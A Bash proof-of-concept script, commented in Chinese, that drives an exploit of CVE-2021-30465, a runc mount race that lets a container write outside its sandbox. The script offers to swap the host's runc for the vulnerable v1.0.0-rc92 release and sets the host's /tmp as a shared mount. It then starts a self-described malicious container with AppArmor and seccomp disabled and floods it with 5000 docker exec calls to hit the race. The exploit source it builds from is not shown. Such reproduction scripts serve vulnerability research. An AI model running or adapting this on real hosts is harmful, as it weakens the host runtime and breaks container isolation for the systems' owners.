#!/bin/bash
# CVE-2021-30465 高级复现脚本

IMAGE_NAME="cve-2021-30465-poc"
TARGET_DIR="/tmp/cve_poc_target"

echo "[*] CVE-2021-30465 安全复现环境初始化..."

# 1. 检查并替换漏洞版本的 runc
check_and_fix_runc() {
    RUNC_PATH=$(which runc)
    [ -z "$RUNC_PATH" ] && RUNC_PATH="/usr/sbin/runc"
    
    CURRENT_VER=$(runc --version | head -n1 | awk '{print $NF}')
    echo "[+] 当前 runc 路径: $RUNC_PATH 版本: $CURRENT_VER"

    if [[ "$CURRENT_VER" != "1.0.0-rc92" ]]; then
        read -p "[?] 当前版本不符，是否下载并替换为 v1.0.0-rc92? [y/N]: " yn
        if [[ "$yn" =~ ^[Yy]$ ]]; then
            echo "[*] 正在下载并备份原 runc..."
            sudo wget -q --show-progress https://github.com/opencontainers/runc/releases/download/v1.0.0-rc92/runc.amd64 -O /tmp/runc_rc92
            if [ $? -ne 0 ]; then
                echo "[!] 下载失败，请检查网络或手动下载 runc.amd64 到 /tmp/runc_rc92"; exit 1
            fi
            sudo mv "$RUNC_PATH" "${RUNC_PATH}.bak" 2>/dev/null
            sudo cp /tmp/runc_rc92 "$RUNC_PATH"
            sudo chmod +x "$RUNC_PATH"
            # 兼容 Ubuntu 路径
            [ -f /usr/bin/runc ] && sudo cp "$RUNC_PATH" /usr/bin/runc
            sudo systemctl restart docker
            echo "[+] runc 替换成功: $(runc --version | head -n1)"
        fi
    fi
}

check_and_fix_runc

# 2. 挂载传播处理
echo "[*] 配置宿主机 /tmp 为共享挂载..."
sudo mount --bind /tmp /tmp 2>/dev/null || true
sudo mount --make-shared /tmp

# 3. 构建/检查镜像
if [[ "$(docker images -q $IMAGE_NAME 2> /dev/null)" == "" ]]; then
    echo "[*] 构建恶意镜像..."
    docker build -t $IMAGE_NAME .
    if [ $? -ne 0 ]; then echo "[!] 镜像构建失败，请检查 Dockerfile 和 exploit.c"; exit 1; fi
fi

# 4. 环境清理与准备
sudo rm -rf "$TARGET_DIR" && mkdir -p "$TARGET_DIR" && chmod 777 "$TARGET_DIR"
docker rm -f cve_poc_container >/dev/null 2>&1

# 5. 启动复现

echo "[*] 启动主攻击容器..."
docker run --rm -d \
  --name cve_poc_container \
  --security-opt apparmor=unconfined \
  --security-opt seccomp=unconfined \
  --volume /tmp:/host/tmp:ro \
  --volume "$TARGET_DIR":/mnt:rshared \
  $IMAGE_NAME

echo "[*] 正在发射 5000 个高频触发器以命中竞争窗口..."
for i in {1..5000}; do
    (timeout 2s docker exec cve_poc_container sleep 0.01 >/dev/null 2>&1 &)
done

echo "[*] 等待 5 秒检测结果..."
sleep 5

# 6. 结果判定
if ls "$TARGET_DIR"/ 2>/dev/null | grep -q .; then
    echo -e "\n\033[32m[+] SUCCESS! 漏洞复现成功！\033[0m"
    echo "[*] 在宿主机目录 $TARGET_DIR 中发现了意外写入的文件："
    ls -la "$TARGET_DIR"
else
    echo -e "\n\033[31m[-] 未能命中竞争条件。\033[0m"
    echo "[*] 提示：该漏洞具有概率性，建议尝试再次运行此脚本。"
fi

# 7. 清理选项
read -p "[?] 是否清理环境 (容器/镜像/挂载)? [y/N]: " clean
if [[ "$clean" =~ ^[Yy]$ ]]; then
    docker stop cve_poc_container >/dev/null 2>&1
    docker rmi $IMAGE_NAME >/dev/null 2>&1
    sudo rm -rf "$TARGET_DIR"
    echo "[+] 清理完毕。"
fi